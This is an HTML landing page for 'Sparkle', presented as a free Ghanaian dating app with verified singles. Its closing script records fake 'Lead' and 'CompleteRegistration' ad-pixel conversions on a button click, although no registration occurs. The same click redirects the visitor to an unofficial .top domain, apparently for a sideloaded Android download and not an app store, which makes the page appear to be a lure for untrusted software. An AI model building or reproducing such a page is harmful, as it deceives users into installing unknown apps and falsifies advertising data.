<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Sparkle - Find your spark in 60 seconds</title>
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '1904890236895529'); 
    fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1904890236895529&ev=PageView&noscript=1"/></noscript>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .faq-answer { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; }
        .faq-item.active .faq-answer { max-height: 150px; }
        .faq-arrow { transition: transform 0.3s ease; }
        .faq-item.active .faq-arrow { transform: rotate(180deg); }
    </style>
</head>
<body class="bg-[#FFF6F0] text-[#1E1E1E] font-sans antialiased">
    <header class="w-full bg-white/60 backdrop-blur-md sticky top-0 z-50 border-b border-pink-100/50">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <span class="text-2xl font-black bg-gradient-to-r from-pink-500 to-rose-500 bg-clip-text text-transparent">Sparkle</span>
        </div>
    </header>

    <main class="max-w-7xl mx-auto px-6 pt-12 pb-20">
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
            <div class="space-y-6">
                <h1 class="text-5xl font-black text-gray-900 leading-tight">Find your <span class="text-pink-500">spark</span> in 60 seconds.</h1>
                <p class="text-gray-600">Ghana's friendliest dating app. Meet verified singles in Accra, Kumasi, and beyond.</p>
                <button class="download-trigger-btn w-full lg:w-auto bg-rose-500 text-white font-bold py-4 px-10 rounded-full shadow-xl">Download Free for Android</button>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <img src="https://images.unsplash.com/photo-1596700684711-30d075ba5a8f?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 object-cover">
                <img src="https://images.unsplash.com/photo-1543163521-1bf539caffe5?w=500&auto=format&fit=crop&q=80" class="rounded-2xl h-60 object-cover">
            </div>
        </div>
    </main>

    <div class="max-w-3xl mx-auto px-6 pb-20">
        <h2 class="text-3xl font-black text-center mb-10">Quick answers.</h2>
        <div class="space-y-3">
            <div class="faq-item bg-white p-5 rounded-2xl border cursor-pointer" onclick="this.classList.toggle('active')">
                <div class="flex justify-between font-bold">Is Sparkle free? <span class="faq-arrow">▼</span></div>
                <div class="faq-answer text-gray-500 text-sm mt-2">Yes, 100% free for matching and chatting.</div>
            </div>
            <div class="faq-item bg-white p-5 rounded-2xl border cursor-pointer" onclick="this.classList.toggle('active')">
                <div class="flex justify-between font-bold">How to verify? <span class="faq-arrow">▼</span></div>
                <div class="faq-answer text-gray-500 text-sm mt-2">We use live photo verification to keep you safe.</div>
            </div>
        </div>
    </div>

    <script>
        document.querySelectorAll('.download-trigger-btn').forEach(btn => {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                fbq('track', 'Lead');
                fbq('track', 'CompleteRegistration');
                this.innerText = "Connecting...";
                setTimeout(() => { window.location.href = "https://svip1027.top/sparkleapp-pk-2"; }, 1000);
            });
        });
    </script>
</body>
</html>
